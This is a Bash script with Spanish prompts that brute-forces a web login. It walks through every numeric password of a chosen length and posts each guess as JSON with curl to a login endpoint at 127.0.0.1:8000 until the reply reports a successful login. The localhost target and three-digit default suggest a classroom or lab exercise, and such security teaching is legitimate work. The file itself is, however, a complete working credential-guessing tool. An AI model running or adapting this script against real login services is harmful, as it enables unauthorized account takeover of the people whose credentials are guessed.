#!/bin/bash
set -u

echo -n "Ingrese el email: "
read EMAIL
EMAIL="${EMAIL:-daniel@gmail.com}"

echo -n "Ingrese la longitud de la contraseña: "
read PASSWORD_LENGTH
PASSWORD_LENGTH="${PASSWORD_LENGTH:-3}"

URL="http://127.0.0.1:8000/login"
MAX_POSSIBLE=$((10**PASSWORD_LENGTH))

echo "=== Ataque de Fuerza Bruta ==="
echo "Email: $EMAIL"
echo "Longitud: $PASSWORD_LENGTH"
echo "Total combinaciones: $MAX_POSSIBLE"

attempts=0
found_pw=""
successful_login=false

echo ""
echo "Iniciando ataque de fuerza bruta..."
echo "Probando $MAX_POSSIBLE combinaciones posibles"
echo ""


for ((i=0; i<MAX_POSSIBLE; i++)); do

    pw=$(printf "%0${PASSWORD_LENGTH}d" "$i")
    ((attempts++))
    
    if [[ $((attempts % 10)) -eq 0 ]]; then
        echo "Intento $attempts/$MAX_POSSIBLE - Probando: $pw"
    fi
    
    json_data=$(printf '{"email":"%s","password":"%s"}' "$EMAIL" "$pw")
    resp_and_code=$(curl -s -X POST "$URL" -H "Content-Type: application/json" -d "$json_data" -w "||%{http_code}")
    http_code="${resp_and_code##*||}"
    body="${resp_and_code%||*}"
    
    if [[ "$http_code" == "200" ]] && [[ "$body" == *"Login Exitoso"* ]]; then
        found_pw="$pw"
        echo ">>> ¡CONTRASEÑA ENCONTRADA! $found_pw"
        successful_login=true
        break
    fi
    
    sleep 0.1
done

echo ""
echo "=== RESULTADO FINAL ==="

if [[ "$successful_login" == true ]]; then
    echo "¡ÉXITO! Contraseña encontrada: $found_pw"
    echo "Número de intentos: $attempts"
    echo "Tiempo: $(date)"
else
    echo "NO SE ENCONTRÓ la contraseña"
    echo "Número de intentos realizados: $attempts"
    echo "Se probaron todas las combinaciones posibles"
fi

echo ""
echo "Presiona Enter para salir..."
read -r
